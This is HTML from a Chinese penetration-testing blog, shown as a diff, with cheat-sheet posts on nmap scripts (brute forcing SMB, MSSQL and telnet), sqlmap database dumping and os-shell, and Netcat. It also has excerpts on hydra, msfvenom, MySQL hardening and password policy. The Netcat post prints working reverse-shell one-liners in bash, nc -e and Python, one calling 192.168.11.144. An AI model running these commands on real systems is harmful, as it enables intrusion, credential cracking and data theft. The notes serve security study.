-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/12/nmap%E5%B7%A5%E5%85%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pokerface">
-      <meta itemprop="description" content="花有重开日，人无再少年。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pokerface博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/12/nmap%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">nmap扫描</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-12 10:39:57" itemprop="dateCreated datePublished" datetime="2021-11-12T10:39:57+08:00">2021-11-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-15 22:16:01" itemprop="dateModified" datetime="2021-11-15T22:16:01+08:00">2021-11-15</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p><strong>Nmap参数：</strong></p>
-<p>-A #进行综合性扫描<br>       -O #进行系统版本扫描<br>       -p #指定端口扫描<br>       -v #显示扫描过程<br>       -e #指定网卡进行扫描<br>       -T #加速扫描过程，默认时序4，最高为6<br>       -n #不进行dns解析<br>       -Pn #不进行ping扫描<br>       -sP #判断主机存活<br>       -sS #SYN半连接扫描探测端口开放状态<br>       -sV #进行服务版本扫描<br>       -sX #圣诞树扫描<br>       -sF FIN扫描<br>       -sU #使用UDP扫描方式确定UDP端口状态<br>       -sT #TCP端口扫描<br>       -sW #滑动窗口扫描<br>       -sO #主机协议扫描<br>       -sL #dns反向解析<br>       -sR #RPC扫描<br>       -sL #完全隐藏扫描<br>       -sn #只进行主机发现，不进行端口扫描<br>       -oX #将扫描结果生成xml文件<br>       -iL #指定文本文件扫描</p>
-<p><strong>Nmap脚本扫描：</strong></p>
-<p>脚本存放路径：/usr/share/nmap/scripts</p>
-<p>nmap –script mysql-vuln-cve2012-2122 ip root连续攻击</p>
-<p>nmap -p3306 –script mysql-empty-password ip 扫描root空口令</p>
-<p>nmap –script=auth IP地址 绕过鉴权的扫描，也可以扫描弱口令<br>       nmap –script=brute IP地址 暴力破解,mysql,snmp,smb,密码猜解</p>
-<p>nmap –script=default IP地址 收集应用服务信息，针对具体服务攻击</p>
-<p>nmap –script=vuln IP地址 检查是否存在常见漏洞<br>       nmap -n -p端口 –script=broadcast IP地址 在局域网探索更多服务</p>
-<p>nmap –script=vnc-auth IP地址 检查VNC认证方式</p>
-<p>nmap –script=vnc-info IP地址 获取VNC信息<br>       nmap –script=smb-brute.nse IP地址 smb破解</p>
-<p>nmap –script=smb-brute.nse –script-args=userdb=/var/passwd,passdb=/var/passwd IP地址 smb字典</p>
-<p>nmap –script=smb-check-vulns.nse –script-args=unsafe=1 IP地址 smb已知几个严重漏洞</p>
-<p>nmap -p 445 –script smb-ls –script-args ‘share=e$,path=,smbpass=test’ IP地址 查看共享目录</p>
-<p>nmap -n -p445 –script=smb-enum-sessions.nse –script-args=smbuser=test,smbpass=test IP地址 查看会话</p>
-<p>nmap -n -p445 –script=smb-os-discovery.nse –script-args=smbuser=test,smbpass=test IP地址 查看系统信息</p>
-<p>nmap -p 1433 –script=ms-sql-brute –script-args=userdb=/var/passwd,passdb=/var/passwd IP地址 猜解微软mssql用          户名和密码</p>
-<p>nmap -p3306 –script=mysql-empty-password.nse IP地址 扫描ROOT空口令</p>
-<p>nmap -p3306 –script=mysql-users.nse –script-args=mysqluser=root IP地址 列出所有mysql用户]</p>
-<p>nmap -sV –script=telnet-brute IP地址 telnet破解</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pokerface">
-      <meta itemprop="description" content="花有重开日，人无再少年。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pokerface博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">sqlmap工具</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-12 08:17:08" itemprop="dateCreated datePublished" datetime="2021-11-12T08:17:08+08:00">2021-11-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-16 14:33:23" itemprop="dateModified" datetime="2021-11-16T14:33:23+08:00">2021-11-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="SQLmap："><a href="#SQLmap：" class="headerlink" title="SQLmap："></a><strong>SQLmap：</strong></h2><p><strong>SQLmap参数：</strong></p>
-<p>-u  URL=URL目标URL</p>
-<p>-r 通过文本来进行探测（抓取数据复制到文本）</p>
-<p>-g Google dork将Google dork结果处理为目标URL</p>
-<p>–data=DATA 通过POST发送的数据字符串（例如“id=1”）</p>
-<p>–cookie=cookie HTTP cookie头值（例如“PHPSESSID=a8d127e..”）</p>
-<p> –random-agent  随机代理使用随机选择的HTTP用户代理头值</p>
-<p> –proxy=PROXY  代理使用代理连接到目标URL</p>
-<p> –level=LEVEL  要执行的测试级别（1-5，默认为1）</p>
-<p>(指定Level进行探测爆破(不加等级时，默认1,最高是5):</p>
-<p>level 1 (不添加时默认)</p>
-<p>level 2 (测试HTTP和cookie)</p>
-<p>level 3 (测试HTTP user-agent/referer)</p>
-<p>不确定payload或那个参数是注入点</p>
-<p>用越高的level探测，时间相对也会长）</p>
-<p> –risk=RISK 风险=执行测试的风险（1-3，默认值1）</p>
-<p> -b, –banner         标题检索DBMS标题</p>
-<p>–second-url          重定第二个网页</p>
-<p> –current-user      当前用户检索DBMS当前用户</p>
-<p> –current-db         当前数据库检索DBMS当前数据库</p>
-<p> –passwords        密码枚举DBMS用户密码哈希</p>
-<p> –tables                表枚举DBMS数据库表</p>
-<p> –columns            列枚举DBMS数据库表列</p>
-<p> –schema             模式枚举DBMS模式</p>
-<p> –dump                 转储DBMS数据库表项</p>
-<p> –dump-all            转储所有转储所有DBMS数据库表条目</p>
-<p> -D DB                  要枚举的D DB DBMS数据库</p>
-<p> -T TBL                 要枚举的TBL DBMS数据库表</p>
-<p> -C COL                要枚举的C列DBMS数据库表列</p>
-<p> –os-shell             用于交互式操作系统外壳的os外壳提示符</p>
-<p> –os-pwn              提示输入OOB外壳、流量计或VNC</p>
-<p> –batch                 批处理从不要求用户输入，请使用默认行为</p>
-<p><strong>SQLmap基本使用：</strong></p>
-<p>指定网页进行注入点探测</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/sqlmap1.png"></p>
-<p>列出当前所有的库</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> --dbs  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/sqlmap2.png"></p>
-<p>列出当前选中库的表</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/sqlmap3.png"></p>
-<p>列出当前选中表和库的字段</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> -T <span class="token string">'表'</span> --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/sqlmap4.png"></p>
-<p>列出当前选中表，库，字段的记录</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> -T ‘表’ -C ‘字段’ --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/sqlmap5.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/10/netcat%E5%B7%A5%E5%85%B7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Pokerface">
-      <meta itemprop="description" content="花有重开日，人无再少年。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pokerface博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/10/netcat%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">Netcat工具</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-11-10 08:34:32" itemprop="dateCreated datePublished" datetime="2021-11-10T08:34:32+08:00">2021-11-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-11-16 14:28:28" itemprop="dateModified" datetime="2021-11-16T14:28:28+08:00">2021-11-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p><strong>Netcat参数：</strong></p>
-<ol>
-<li>-c shell命令为“-e”；使用/bin/sh执行</li>
-<li>-e 文件名连接后要执行的程序</li>
-<li>-b 允许广播</li>
-<li>-g 网关源路由跃点，最多8个</li>
-<li>-G num源路由指针：4，8，12</li>
-<li>-l 侦听模式，用于入站连接</li>
-<li>-n 仅数字IP地址，无DNS</li>
-<li>-o 文件十六进制流量转储</li>
-<li>-p 端口本地端口号</li>
-<li>-r 随机化本地和远程端口</li>
-<li>-q 秒在标准DIN上的EOF和秒延迟后退出</li>
-<li>-s 地址本地源地址</li>
-<li>-T tos集合服务类型</li>
-<li>-u UDP模式</li>
-<li>-v verbose[使用两次更详细]</li>
-<li>-C 发送CRLF作为行结束</li>
-<li>-z 零I/O模式[用于扫描]</li>
-</ol>
-<p><strong>Netcat常见使用方法：</strong></p>
-<ol>
-<li><p>监听本地端口，以详细列出</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -lvvp <span class="token punctuation">[</span>Port<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/nc1.png"></p>
-</li>
-<li><p>扫描目标指定端口范围开放状态</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -v -z <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/nc2.png"></p>
-</li>
-<li><p>UDP扫描端口并返回端口信息</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -v -z -u <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/images/nc3.png"></p>
-</li>
-<li><p>在目标机没有nc的情况下</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：bash -i <span class="token operator">>&amp;</span> /dev/tcp/Ip/Port <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>本地机：</p>
-<p><img src="/images/nc4.png"></p>
-<p>目标机：</p>
-<p><img src="/images/nc5.png"></p>
-</li>
-<li><p>windows下反弹cmd</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span> -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><p>linux下反弹cmd</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span> -e /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><p>文件传输</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -lvvp <span class="token number">8888</span> <span class="token operator">&lt;</span> <span class="token number">1</span>.txt 服务端
-	 <span class="token function">nc</span> -vn <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token number">8888</span> <span class="token operator">></span> <span class="token number">1</span>.txt 客户端<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
-<li><p>nc反弹nc</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -e /bin/bash <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><p>http请求（也可以进行ftp匿名探测）</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-<li><p>python构造连接</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.11.144",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
       }
     }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><script src="/js/sakura.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pokerface" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/Pictrue.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/background.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Pokerface</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Pokerface</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/Pokerface927" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left"><a href="/2021/12/14/hydra/" title="hydra"><img class="post_bg" src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hydra"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/12/14/hydra/" title="hydra">hydra</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-12-14T12:47:04.000Z" title="发表于 2021-12-14 20:47:04">2021-12-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/">密码爆破</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">渗透工具</a></span></div><div class="content">选项：
+-l LOGIN或-l使用登录名登录文件，或从文件中加载多个登录
+-p PASS或-p FILE尝试密码PASS，或从文件中加载多个密码
+-C文件冒号分隔的“login:pass”格式，而不是-L/-P选项
+-M要攻击的服务器的文件列表，每行一个条目，“：”以指定端口
+-t任务运行任务每个目标的并行连接数（默认值：16）
+-U服务模块使用详细信息
+-h更多命令行选项（完整帮助）
+服务器目标：DNS、IP或192.168。0.0/24（此选项或-M选项）
+为破解服务提供服务（有关支持的协议，请参见下文）
+选择某些服务模块支持附加输入（-U表示模块帮助）
+支持的服务：adam6500 asterisk cisco cisco enable cvs firebird ftp[s]http[s]{head | get | post}http[s]{get | post}-表单http代理http代理urlenum icq imap[s]irc ldap2[s]ldap3[-{cram | digest}md5][s]memcached mongodb mssql mysql nntp  ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/11/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%A0%E5%9B%BA/" title="数据库加固"><img class="post_bg" src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据库加固"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%A0%E5%9B%BA/" title="数据库加固">数据库加固</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-11-19T00:11:35.000Z" title="发表于 2021-11-19 08:11:35">2021-11-19</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%A0%E5%9B%BA/">数据库加固</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/">安全策略</a></span></div><div class="content">数据库加固配置
+以普通用户MySQL运行MySQL，禁止MySQL以管理员权限运行
+修改/etc/my.cnf文件
+在[mysqld]下添加user=mysql（用户得自行创建）
+修改完重启mysql服务 systemctl restart mysqld
+
+
+
+删除默认数据库(test)
+drop database test;
+改变默认MySQL管理员为SuperRoot
+use mysql
+update user set user='SuperRoot' where user='root'
+select user,host from user
+flush privileges
+
+
+
+使用MySQL内置MD5函数给用户加密，密码为123
+update user set password=password(MD5('123')) where user='user1';
+flush privileges #刷新
+注：这边默认是authentication_string，一般默认为password
+
+
+
+赋予user1对数据库只有select，insert，dalete，update权限
+s ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/11/18/iptables/" title="iptables"><img class="post_bg" src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="iptables"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/18/iptables/" title="iptables">iptables</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-11-18T00:13:25.000Z" title="发表于 2021-11-18 08:13:25">2021-11-18</time></span></div><div class="content"></div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/11/17/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE/" title="密码策略配置"><img class="post_bg" src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="密码策略配置"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/17/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE/" title="密码策略配置">密码策略配置</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-11-17T02:13:49.000Z" title="发表于 2021-11-17 10:13:49">2021-11-17</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5/">密码策略</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/">安全策略</a></span></div><div class="content">密码策略配置Windows下的密码配置
+​    前提：一些windows版本没有组策略，需要自行配置，复制下方内容到txt文本，后缀改为bat或cmd运行即可
+@echo off
+
+pushd "%~dp0"
+
+dir /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum >List.txt
+
+dir /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum >>List.txt
+
+for /f %%i in ('findstr /i . List.txt 2^>nul') do dism /online /norestart /add-package:"C:\Windows\servicing\Packages\%%i"
+
+pause
+
+
+配置密码复杂性，密码最长使用期限，密码长度最小值不小于八位
+
+（Win+R输入 gpedi ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/11/15/Msfvenom/" title="Msfvenom"><img class="post_bg" src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Msfvenom"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/15/Msfvenom/" title="Msfvenom">Msfvenom</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-11-15T03:25:23.000Z" title="发表于 2021-11-15 11:25:23">2021-11-15</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">渗透工具</a></span></div><div class="content">MsfvenomMsfvenom参数：
+用法：/usr/bin/msfvenom[选项]&lt;var=val&gt;
+示例：/usr/bin/msfvenom-p windows/meterpeter/reverse_tcp LHOST=-f exe-o payload.exe
+选项：
+-l、 –列出&lt;类型&gt;列出[类型]的所有模块。类型有：有效载荷、编码器、NOP、平台、ARCH、加密、格式等
+-p、 –payloadpayload to use（–list payload to list，–list参数选项）。为自定义指定“-”或STDIN
+–列表选项列表–有效载荷的标准、高级和规避选项
+-f、 –format输出格式（使用–list要列出的格式）
+-e、 –编码器&lt;编码器&gt;要使用的编码器（使用–列出要列出的编码器）
+–服务名称生成服务二进制文件时要使用的服务名称
